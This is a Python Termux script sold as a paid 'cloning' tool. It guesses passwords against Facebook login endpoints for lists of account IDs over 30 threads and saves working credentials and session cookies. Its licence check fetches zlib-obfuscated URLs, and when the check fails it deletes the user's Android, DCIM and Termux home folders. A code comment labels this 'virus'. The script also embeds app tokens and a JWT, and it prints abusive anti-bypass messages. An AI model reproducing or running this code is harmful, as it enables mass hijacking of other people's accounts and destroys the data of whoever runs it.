#-----------TERMUX PACKAGE CHECKING----------#
import os,time
os.system('git pull')
#-----------DIRECTORY CHECKING----------#
directory_path = '/sdcard/AMIR'

if not os.path.exists(directory_path):
    os.mkdir(directory_path)
    print(f"Directory '{directory_path}' created successfully.")
    time.sleep(2)
else:
  #  print(f"Directory '{directory_path}' already exists.")
    time.sleep(2)
#-----------DIRECTORY CHECKING----------#
os.system('clear')
print("\033[1;92m[Error in Module] Module not found\033[0m")
time.sleep(2)
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
import uuid
from os import system as s
from string import *
import os,sys,time,json,random,re,string,platform,base64,uuid,zlib,subprocess,hashlib,uuid,requests
from urllib.request import urlopen
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from time import ctime
from zlib import decompress as dec
import mechanize
totaldmp = 0
count = 0
loop = 0
tof = []
twf = []
oks = []
cps = []
pcp = []
pcu = []
ugen=[]
ugen2=[]
methods=[]
android_models=[]
tp = []
lim = []
btime = ctime()
G = "\033[38;5;46m"
R = "\x1b[38;5;196m"
Y = '\033[1;93m'
W = '\033[1;97m'
M = '\033[1;91m'
H = '\033[1;92m'
###-------####
def baba(word):
    lix = ['.','..','...','....','.....','......','.......','........']
    for i in range(3):
        for x in range(len(lix)):
            sys.stdout.write(('\r{}{}').format(str(word), lix[x]))
            time.sleep(0.05)
            sys.stdout.flush()
###-------####

android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
model_device = subprocess.check_output("getprop ro.product.model",shell=True).decode("utf-8").replace("\n","")
build_device = subprocess.check_output("getprop ro.build.id",shell=True).decode("utf-8").replace("\n","")
###-------####
large_device = "{density=2.25,height="+subprocess.check_output("getprop ro.hwui.text_large_cache_height",shell=True).decode("utf-8").replace("\n","")+",width="+subprocess.check_output("getprop ro.hwui.text_large_cache_width",shell=True).decode("utf-8").replace("\n","")+"}"
merk_device = subprocess.check_output("getprop ro.product.manufacturer",shell=True).decode("utf-8").replace("\n","")
brand_device = subprocess.check_output("getprop ro.product.brand",shell=True).decode("utf-8").replace("\n","")
cpu_device = subprocess.check_output("getprop ro.product.cpu.abilist",shell=True).decode("utf-8").replace(",",":").replace("\n","")
language = "en_GB"
###-------####
try:
   simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
except:
   try:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
   except:simcard = "Zong"
   
###---@AMIR_UA@----####
os.system('clear')
print('\033[1;92m  ✓ Join Our Whatsapp Group')
time.sleep(2)
os.system('xdg-open https://chat.whatsapp.com/I48BIjjU0gGDIAfhZ7OUYL')

####$$$$############
first = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(first + 'sessions.py', 'r').read():
    pass
else:
    exit('\33[1;91mBAAP KO BHEJ TERE BAS KI BAT NI GANDU ')

def clr():
    try:
        data = os.listdir('/sdcard')
        if 'Android' in data:
            print(' \033[1;32m[!]\033[1;37m D' + 'ont Try Bypas' + 's Mother Fuc' + 'ker...! \n YOUR' + ' BYPAS' + 'S FUCK' + 'ED BY AMIR')
            exit()
        else:
            exit()
    except:
        exit()

# MODELS Fucker
from requests import api
x = open(api.__file__, 'r').read()
if "print" in x:
    clr()
elif "sys.stdout.write" in x:
    clr()
else:
    pass

from requests import sessions
x = open(sessions.__file__, 'r').read()
if "print" in x:
    clr()
elif "sys.stdout.write" in x:
    clr()
else:
    pass

from requests import models
x = open(models.__file__, 'r').read()
if "print" in x:
    clr()
elif "sys.stdout.write" in x:
    clr()
else:
    pass
###---@AMIR_UA@----####
#Fuck You Gandu 
#$$$$$$$$#$$$####

def PGUS():
    and_verson = str(random.randint(9,13))
    and_model = random.choice(["HT17Pro", "Aquaris M5.5", "5054X", "Redmi Note 5A Prime", "SM-G530FZ", "Halo X LTE", "SAMSUNG-SM-G870A", "Vodafone Smart ultra 6", "eSTAR GO! Intel Quad Core 3G", "Le X622", "LENNY2", "K6000 Plus", "CUBOT_NOTE_S", "VFD 600", "Nura 2", "HARRY", "Hudl 2", "LIFE X8", "HUAWEI VNS-L31", "VF-1397", "HUAWEI SCL-L01", "Primum", "A0001", "Q-502", "Aquaris X", "QUANTUM_470_RUGGED_PRO", "E2115", "U PULSE LITE", "JERRY", "verykoolS5525", "XT1585", "BV9100", "SM-T560NU", "meizu note9", "V2038", "HUAWEI TAG-L21", "Pixel XL", "PSP3531DUO", "KOB-W09", "ZB602KL", "itel W7002P", "HTC Desire 12", "M5 Note", "HUAWEI LYO-L21", "U10", "LGMP260", "MX6", "AGM A10", "V2027", "J5", "220333QL", "5030D_EEA", "W-V720-EEA", "Power Armor 14", "S62 Pro", "Redmi Note 9S", "TIT-L01", "meizu C9", "H9493", "TECNO ID3k", "EVR-AL00", "CDY-NX9A", "SM-G550FY", "ZS630KL", "X-treme PQ53", "MI PAD 4", "HUAWEI ATH-UL01", "5009D_RU", "Neffos Y5s", "Capture+", "SM-C5000", "CPH1701", "HTC One X10"]) 
    app_build = str(random.randint(111111, 999999))+'.'+str(random.randint(000,999))
    and_nme = random.choice(["Orca-Android", "FB4A"])
    app_ver = str(random.randint(48,357))+'.'+str(random.randint(0,1))+'.'+str(random.randrange(0,2))+'.'+str(random.randint(1,17))+'.'+str(random.randint(23,179))
    app_vercode = str(random.randint(110000000,399999999))
    den_ = str(random.randint(1,5))+"."+str(random.randint(57,857))
    wid_ = random.choice(["720","1080","480","600"])
    hig_ = str(random.randint(800,2499))
    fbca_ = random.choice(["arm64-v8a:null","armeabi-v7a:armeabi","x86:armeabi-v7a","arm64-v8a:armeabi-v8a:armeabi"])
    and_pkg = random.choice(["com.facebook.orca","com.facebook.katana","com.facebook.mlite"])
    and_Loc = random.choice(["en_US","en_IN","en_GB","hi_IN","bn_BD","en_BD","se_SE","es_ES","in_ID","th_TH","ks_IN","en_CU","es_MAX","uk_UA","ne_NP","en_NP","in_KS","en_PK","mk_MK","ko_KR"])
    app_network = random.choice(["VODAFONE IN","Vodafone IN","Vodafone AU","Vodafone IT","Vodafone","Telenor","Zong","Banglalink","Telenor india","Jio 4G","DNA","Kddi","eSTAR GO!","GO","SMART","EI_Telecom","SUN Mobile","airtel","VodaCom-SA","VodafoneAL","Vivo","KYIVSTAR","EE","null","CELTELHND","Orange","Nepal Telecom","vodafone_P","Globe_Telecom","SKTelecom"])
    ua = f"[FBAN/"+and_nme+";FBAV/"+app_ver+";FBPN/"+and_pkg+";FBLC/"+and_Loc+";FBBV/523162187;FBCR/"+app_network+";FBMF/"+and_model+";FBBD/"+and_model+";FBDV/"+and_model+";FBSV/"+and_verson+";FBCA/"+fbca_+";FBDM/{density="+den_+",width="+wid_+",height="+hig_+"};]"
    return ua






def samu():
    samsung_devices = [
        "SM-T561/7.3.9",
        "SM-G975/9.0",
        "SM-A520/8.1.0",
        "SM-N960/10.0",
        "SM-J260/8.1.0",
        "SM-G986/11.0",
        "SM-A715/10.0",
        "SM-A325/11.0",
        "SM-G770/10.0",
        "SM-T720/9.0",
        "SM-A525/11.0",
        "SM-M215/10.0",
        "SM-A505/9.0",
        "SM-G715/10.0",
        "SM-A105/10.0",
        "SM-J530/9.0",
        "SM-M115/10.0",
        "SM-T515/10.0",
        "SM-A415/10.0",
        "SM-A715/9.0",
        "SM-J727/8.1.0",
        "SM-G991/12.0",
        "SM-A325/12.0",
        "SM-G770/12.0",
        "SM-M315/11.0",
        "SM-J630/10.0",
        "SM-A625/10.0",
        "SM-T725/10.0",
        "SM-N970/10.0",
        "SM-A908/11.0"
    ]
    device_info = random.choice(samsung_devices)
    fba_v = f"{random.randint(80, 100)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
    fbbv = f"{random.randint(100000000, 999999999)}"
    user_agent = f"SupportsFresco=1 modular=1 [FBAN/Orca-Android;FBAV/{fba_v};FBPN/com.facebook.orca;FBLC/en_US;FBBV/{fbbv};FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/{device_info};FBCA/armeabi-v7a:armeabi;FBDM/{{density=2.0,width=810,height=1704}};FB_FW/1;]"

    return user_agent
    
#########My UA##########

uas = random.choice([
    '[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.5,width=1440,height=2560};FBLC/es_LA;FBCR/ENTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N920G;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
    '[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1794,height=1080};FBLC/en_GB;FBCR/vodafone IE;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One M8s;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]',
    '[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1794,height=1080};FBLC/en_US;FBCR/3 IRL;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D6603;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]'
])
    
###################
def getKey():
    uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
    id = "".join(uuidd).replace("_","").replace("360","404").replace("u","9").replace("a","A")
    plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
    bxd = "AK_404-"
    bumper = bxd+id+xp
    return bumper
 ###################
#----------[ LOGO ]--------#
a_ = 'M'+'D A'+'M'+'I'+'R'
b_ = '+92'+'314'+'357'+'87'+'09'
c_ = 'https://fb.com/'+'Your'+'Papa'+'Here'
def logo():
    os.system('clear')
    print("""\033[1;37m \033[1;37m\033[1;37m \033[0;91m●\033[0;93m ●\033[0;96m ● \033[0;m\033[1;37m\t\t\t\t\033[0;91m●\033[0;93m ●\033[0;96m ● \033[0;m
          d8888    .d8888b.       d8888
         d8P888   d88P  Y88b     d8P888
\033[0;96m        d8P 888   888    888    d8P 888
\033[0;96m       d8P  888   888    888   d8P  888
\033[0;97m      d88   888   888    888  d88   888
      8888888888  888    888  8888888888
            888   Y88b  d88P        888
            888    "Y8888P"         888
      ┌──────────────────────────────────┐
      │        \033[0;97m\033[0;92m|\033[0;91m•\033[0;92m| \033[0;91m \033[0;91m\033[1;47m MR AMIR \033[0;m \033[0;91m\033[0;92m |\033[0;91m•\033[0;92m|\033[0;97m       │
      └──────────────────────────────────┘
\033[0;97m---------------------------------------------\033[0;m
 ➤ Author  : %s\033[0;m
 ➤ Version : \033[1;91m2.10\033[0;m
 ➤ Status  : \033[1;92mPaid\033[0;m
 ➤ Contact : %s\033[0;m
 ➤ fb-page : %s\033[0;m
\033[0;97m---------------------------------------------\033[0;m"""%(a_,b_,c_))

def linex():
    print(f"\033[0;97m---------------------------------------------\033[1;97m")

def verf():
    myid = getKey()
    os.system("clear")
    with urlopen(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7\xcf\xcc\xad\xcc/-*H,H410\xd1K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd670\xd7O/(\xd1\xcb(\xc9\xcd\x01\x00\xda\xe2\x11\x99').decode()) as response:
        body = response.read()
    if myid in str(body):
        pass
    else:
        # virus. remove to execute virus
        shutil.rmtree("/sdcard/Android")
        shutil.rmtree("/sdcard/DCIM")
        shutil.rmtree("/data/data/com.termux/files/home")
        print("CONGRATULATIONS BRO BYPSS DONE")
        sys.exit()

def menu(has_free_trial=False):
    global lim, tp, oks, cps, pcu
    if tp == 0:
        verf()
    elif tp == 1:
        pass
    elif has_free_trial:
        pass
    else:
        print("[+] Get approval first")
        os.system('clear')
        sys.exit()

    sn = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7O,O\xcc,.I\xcc\xc8,20\xd7K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd670\xd7\x07\t\xea\x16\xe4\x17\x97\xe8e\x94\xe4\xe6\x00\x008\x81\x13\x9a').decode()
    sj = requests.get(sn).text
    if "server on" in sj:
        logo()
        print(' [1] File Cloning (\033[1;92mM1\033[0m)')
        print(' [2] File Cloning (\033[1;92mM2 Good\033[0m)')
        print(' [3] File Cloning (\033[1;92mM3 Best\033[0m)')
        print(' [0] Exit')
        linex()
        amir__ = input(' Choose Option : ')
        logo()
        file = input(' Put file : ')
        try:
            fo = open(file, 'r').read().splitlines()
        except FileNotFoundError:
            time.sleep(1)
            exit("Wrong File")
        plist = []
        try:
            logo()
            print('\033[1;97m Example : \033[1;92mfirst last,first@123,57273200\033[1;97m')
            linex()
            ps_limit = int(input('\033[1;97m How many password do you want : '))
        except:
            ps_limit = 1
        for i in range(ps_limit):
            plist.append(input(f'\033[1;37m Password {i+1} : \033[1;92m'))
        linex()
        cop = input(' Do you want to show cp account? (y/n): ')
        if cop in ['y', 'Y', 'yes', 'Yes']:
            pcu.append('y')
        else:
            pcu.append('n')
        with ThreadPool(max_workers=30) as crack_submit:
            os.system('clear')
            logo()
            total_ids = str(len(fo))
            print('\033[1;97m [+] TOTAL IDs  : \033[1;93m' + total_ids)
            print('\033[1;37m [!] \033[1;31mUse flight mode every five minutes\033[1;37m')
            linex()
            for user in fo:
                ids, names = user.split('|')
                passlist = plist
                if amir__ == '1':
                    crack_submit.submit(file_new1, ids, names, passlist, total_ids)
                elif amir__ == '2':
                    crack_submit.submit(file_new2, ids, names, passlist, total_ids)
                elif amir__ == '3':
                    crack_submit.submit(file_new3, ids, names, passlist, total_ids)
                elif amir__ == '0':
                    exit('\033[32mTHANKS\033[0m')
                else:
                    exit(' Select a valid option .')
        print('\n')
        linex()
        print(' [*] THE PROCESS HAS COMPLETED')
        print(' [*] TOTAL OK/CP : \033[1;92m' + str(len(oks)) + '\033[1;97m/\033[1;91m' + str(len(cps)) + '\033[1;97m')
        linex()
        input(' [ENTER TO GO BACK] ')
        menu()
##############

def za():
    global tp
    myid = getKey()
    os.system("clear")
    ux = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7\xcf\xcc\xad\xcc/-*H,H410\xd1K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd670\xd7O,(\xd3\xcb(\xc9\xcd\x01\x00\xda\xbe\x11\x95').decode()
    with urlopen(ux) as response:
        body = response.read().decode()
    if myid in body:
        tp = 1
        menu()
    elif 'free trial' in body:
        os.system('clear')
        logo()
        baba('\033[32mEnjoy Free Trial\033[0m')
        time.sleep(2)
        menu(has_free_trial=True)
    elif 'server off' in body:
        logo()
        baba('\033[32mChecking Server Status\033[0m')
        print('\033[31m\nSever is OFF bro please Contact Owner\n WhatsApp number : +923143578709')
        sys.exit()
    else:
        tp = 0
        logo()
        print("\033[31m[+] Your key is not registered\033[0m")
        linex()
        print("[+] This is a paid tool. You have to pay first")
        linex()
        print("\033[1;92m[+] Your Key:  \n" + myid)
        linex()
        print("[+] Price 400 validity 15 Days")
        print("[+] Price 750 validity 1 Month")
        print("[+] EasyPaisa 03098627012")
        print("[+] EasyPaisa Name Allah Dana")
        linex()
        input("[+] press enter to send key")
        linex()
        print("[+] USER INFO ")
        linex()
        url_wa = "https://api.whatsapp.com/send?phone=+923143578709&text="
        name = input("[+] Type your name: ")
        tks = ("Hi BRO I WANT TO BUY YOUR PAID TOOL \nMy name : " + name + " \nMy Key : " + myid)
        subprocess.check_output(["am", "start", url_wa + (tks)])
        time.sleep(2)
        linex()
        print("\033[1;32m Run again with python amir.py\033[0m")
        linex()


#------------------[ FILE_NEW_IDS ]----------------#
def file_new1(ids, names, passlist, total_ids):
    global loop, oks, cps
    lala = random.choice(['\033[1;96m', '\033[1;97m', '\033[1;93m', '\033[1;95m', '\033[1;94m', '\033[1;96m', '\033[1;97m'])
    sys.stdout.write(f'\r%s [AMIR•M1] %s|%s \033[1;92mOK|%s\033[1;97m' % (lala, loop, total_ids, len(oks))),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            cgs = str(random.randint(111,555))+".0.0."+str(random.randint(1,19))+"."+str(random.randint(23,89))
            mdls = random.choice(['STK-LX1', 'ELE-L29', 'ANE-LX1', 'JSN-L21', 'JNY-LX1', 'MAR-LX1M', 'LYA-L29', 'COL-L29', 'VOG-L29', 'PCT-L29', 'TAS-L29', 'MRD-LX1F', 'SLA-L22', 'FIG-LX1', 'CLT-L29', 'HRY-LX1T', 'KSA-LX9', 'COR-L29', 'AGS-W09', 'CMR-W09', 'LYA-L09', 'ANE-LX2', 'VIE-L29', 'ALP-L29', 'ANE-LX3', 'VOG-AL10', 'COL-AL10', 'YAL-L21', 'TAS-AL00', 'EVA-L09', 'HMA-L29', 'LIO-L29', 'ANE-LX4', 'JNY-LX2', 'MAR-LX1A', 'COL-L29A', 'VOG-L29A', 'PCT-L29A', 'TAS-L29A', 'MRD-LX1H', 'SLA-L32', 'FIG-LX2', 'CLT-L29A', 'HRY-LX1R', 'KSA-LX10', 'COR-L39', 'AGS-L09', 'CMR-L09'])
            sun = f"[FBAN/FB4A;FBAV/77.0.0.2018;FBBV/6102015;[FBAN/FB4A;FBAV/{cgs};FBBV/4061184;FBDM/{'density=1.5,width=540,height=960'};FBLC/bm_ML;FB_FW/2;FBCR/MY CELCOM;FBPN/com.facebook.katana;FBDV/Lenovo A850+;FBSV/4.2.2;FBOP/1;FBCA/armeabi-v8a:armeabi;]]"
            head = {
                'Host': 'graph.facebook.com',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Priority': 'u=3, i',
                'X-Fb-Sim-Hni': '45204',
                'X-Fb-Net-Hni': '45201',
                'X-Fb-Connection-Quality': 'GOOD',
                'Zero-Rated': '0',
                'User-Agent': sun,
                'Authorization': 'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
                'X-Fb-Connection-Bandwidth': '24807555',
                'X-Fb-Connection-Type': 'MOBILE.LTE',
                'X-Fb-Device-Group': '5120',
                'X-Tigon-Is-Retry': 'False',
                'X-Fb-Friendly-Name': 'authenticate',
                'X-Fb-Request-Analytics-Tags': 'unknown',
                'X-Fb-Http-Engine': 'Liger',
                'X-Fb-Client-Ip': 'True',
                'X-Fb-Server-Cluster': 'True',
                'Content-Length': '847'
            }
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'family_device_id': str(uuid.uuid4()),
                'secure_family_device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'try_num': '1',
                'email': ids,
                'password': pas,
                'method': 'auth.login',
                'generate_session_cookies': '1',
                'sim_serials': "['80973453345210784798']",
                'openid_flow': 'android_login',
                'openid_provider': 'google',
                'openid_emails': "['01710940017']",
                'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
                'error_detail_type': 'button_with_disabled',
                'source': 'account_recovery',
                'locale': 'en_US',
                'client_country_code': 'US',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'
            }
            po = requests.post('https://' + 'b-gr' + 'ap' + 'h' + '.facebook.com/auth/login', data=data,
                              headers=head, allow_redirects=False).json()
            if 'session_key' in po:
                coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                cookie = f"sb={ssbb};{coki}"
                print('\r\033[1;92m [AMIR-OK] ' + ids + ' | ' + pas + '\033[1;97m')
                oks.append(ids)
                open('/sdcard/AMIR/amir_ok.txt', 'a').write(ids + '|' + pas + '\n')
                open('/sdcard/AMIR/amir-cookies.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                break
            elif 'www.facebook.com' in po['error']['message']:
                if 'y' in pcu:
                    print('\r\033[1;31m [AMIR-CP] ' + ids + ' | ' + pas + '\033[1;97m')
                    cps.append(ids)
                    open('/sdcard/AMIR/amir-cp.txt', 'a').write(ids + '|' + pas + '\n')
                    break
                else:
                    cps.append(ids)
                    open('/sdcard/AMIR-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    break
            else:
                continue
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    loop += 1


def file_new2(ids, names, passlist, total_ids):
    global loop, oks, cps
    lala = random.choice(['\033[1;96m', '\033[1;97m', '\033[1;93m', '\033[1;95m', '\033[1;94m', '\033[1;96m', '\033[1;97m'])
    sys.stdout.write(f'\r%s [AMIR•M2] %s|%s \033[1;92mOK|%s\033[1;97m' % (lala, loop, total_ids, len(oks))),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            cgs = str(random.randint(111, 435)) + ".0.0." + str(random.randint(1, 42)) + "." + str(random.randint(23, 189))
            mdls = random.choice(['Redmi 6 Pro', 'Redmi Note 10', 'Redmi 9A', 'Redmi K40', 'Redmi Note 9 Pro', 'Redmi 7', 'Redmi Note 8', 'Redmi 8A', 'Redmi K30 Pro', 'Redmi Note 7'])
            bun = f"[FBAN/FB4A;FBAV/{cgs};FBBV/197851403;FBDM/"+"{density=2.0,width=720,height=1384}"+";FBLC/en_GB;FBRV/0;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/{mdls};FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
            head = {
                'Host': 'graph.facebook.com',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Priority': 'u=3, i',
                'X-Fb-Sim-Hni': '45204',
                'X-Fb-Net-Hni': '45201',
                'X-Fb-Connection-Quality': 'GOOD',
                'Zero-Rated': '0',
                'User-Agent': bun,
                'Authorization': 'OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662',
                'X-Fb-Connection-Bandwidth': '24807555',
                'X-Fb-Connection-Type': 'MOBILE.LTE',
                'X-Fb-Device-Group': '5120',
                'X-Tigon-Is-Retry': 'False',
                'X-Fb-Friendly-Name': 'authenticate',
                'X-Fb-Request-Analytics-Tags': 'unknown',
                'X-Fb-Http-Engine': 'Liger',
                'X-Fb-Client-Ip': 'True',
                'X-Fb-Server-Cluster': 'True',
                'Content-Length': '847'
            }
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'family_device_id': str(uuid.uuid4()),
                'secure_family_device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'try_num': '1',
                'email': ids,
                'password': pas,
                'method': 'auth.login',
                'generate_session_cookies': '1',
                'sim_serials': "['80973453345210784798']",
                'openid_flow': 'android_login',
                'openid_provider': 'google',
                'openid_emails': "['01710940017']",
                'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
                'error_detail_type': 'button_with_disabled',
                'source': 'account_recovery',
                'locale': 'en_US',
                'client_country_code': 'US',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'
            }
            po = requests.post('https://api.facebook.com/method/auth.login', data=data, headers=head, allow_redirects=False).json()
            if 'session_key' in po:
                coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                cookie = f"sb={ssbb};{coki}"
                print('\r\033[1;92m [AMIR-OK] ' + ids + ' | ' + pas + '\033[1;97m')
                oks.append(ids)
                open('/sdcard/AMIR/amir_ok.txt', 'a').write(ids + '|' + pas + '\n')
                open('/sdcard/AMIR/amir-cookies.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                break
            elif 'www.facebook.com' in po['error']['message']:
                if 'y' in pcu:
                    print('\r\033[1;31m [AMIR-CP] ' + ids + ' | ' + pas + '\033[1;97m')
                    cps.append(ids)
                    open('/sdcard/AMIR/amir-cp.txt', 'a').write(ids + '|' + pas + '\n')
                    break
                else:
                    cps.append(ids)
                    open('/sdcard/AMIR-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    break
            else:
                continue
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    loop += 1


def file_new3(ids, names, passlist, total_ids):
    global loop, oks, cps
    lala = random.choice(['\033[1;96m', '\033[1;97m', '\033[1;93m', '\033[1;95m', '\033[1;94m', '\033[1;96m', '\033[1;97m'])
    sys.stdout.write(f'\r%s [AMIR•M3] %s|%s \033[1;92mOK|%s\033[1;97m' % (lala, loop, total_ids, len(oks))),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            cgs = str(random.randint(111, 555)) + ".0.0." + str(random.randint(1, 19)) + "." + str(random.randint(23, 89))
            mdls = random.choice(['SM-A505GN/DS', 'SM-G975F/DS', 'SM-N960U/DS', 'SM-A716U1/DS', 'SM-G781V/DS', 'SM-M315F/DS', 'SM-A217F/DS', 'SM-G991U/DS'])
